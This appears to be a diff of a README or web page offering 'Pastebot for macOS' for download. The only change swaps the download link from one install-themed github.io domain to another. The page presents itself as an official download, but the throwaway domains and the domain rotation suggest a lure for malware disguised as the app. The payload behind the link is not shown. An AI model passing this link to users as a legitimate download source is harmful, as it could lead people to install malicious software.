@@ -6,7 +6,7 @@
 <h3>Pastebot for macOS</h3>
 <p>Pastebot Mac Edition is an efficient clipboard manager that tracks everything you copy and makes it easy to reuse and organize snippets.</p>
 
-<a href="https://quick-mac-install.github.io/.github/Pastebot">
+<a href="https://mac-software-install.github.io/.github/Pastebot">
   <img src="https://i.postimg.cc/4NYk88tL/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
